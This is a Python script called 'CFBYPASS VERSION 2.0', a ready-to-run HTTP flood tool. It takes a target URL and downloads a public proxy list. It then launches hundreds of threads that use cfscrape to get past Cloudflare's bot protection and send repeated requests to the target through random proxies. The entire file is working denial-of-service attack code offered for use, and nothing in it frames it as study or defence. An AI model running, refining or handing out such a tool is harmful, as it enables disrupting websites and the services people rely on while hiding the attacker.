import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore
print(Fore.RED + """  

 ██████╗███████╗██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██║     █████╗  ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
██║     ██╔══╝  ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
╚██████╗██║     ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
 ╚═════╝╚═╝     ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                           VERSION 2.0
""")
print(Fore.YELLOW + "Developed by Max McKinley - 07/11/2021")

def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(a+1) + " Created ")
	print(Fore.RED + "Wait A Few Seconds For Threads Ready To Attack...")
	time.sleep(10)
	input(Fore.CYAN + "Press Enter To Launch Attack!")
	global oo
	oo = True

oo = False
def main():
	global url
	global list
	global pprr
	global thr
	global per
	url = str(input(Fore.GREEN + "Url: " + Fore.WHITE))
	ssl = str(input(Fore.GREEN + "Enable SSL Mode? (y/n): " + Fore.WHITE))
	ge = str(input(Fore.GREEN + "Get New Proxies List? (y/n): " + Fore.WHITE))
	if ge =='y':
		if ssl == 'y':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000') #Code By Max McKinley
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "API Connection Regarding List Successful!")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') #Code By Max McKinley
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "API Connection Regarding List Successful!")
	else:
		pass
	list = str(input(Fore.GREEN + "List (proxies.txt): " + Fore.WHITE))
	pprr = open(list).readlines()
	print(Fore.GREEN + "Proxies Count: " + Fore.WHITE + "%d" %len(pprr))
	thr = int(input(Fore.GREEN + "Threads (1-400 Default Is 300): " + Fore.WHITE))
	per = int(input(Fore.GREEN + "CC.Power (1-100 Default Is 70): " + Fore.WHITE))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(5)
	while True:
		while oo:
			try:
				s.get(url)
				print(Fore.CYAN + "Bypass -> " + Fore.WHITE + str(url)+ Fore.CYAN + " From~# " +Fore.WHITE+ str(proxy[0])+":"+str(proxy[1]))
				try:
					for g in range(per):
						s.get(url)
						print(Fore.CYAN + "Bypass -> " + Fore.WHITE + str(url)+Fore.CYAN + " From~# " +Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
					s.close()
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + "CANNOT CONNECT PROXIES TO URL!")


if __name__ == "__main__":
	main()
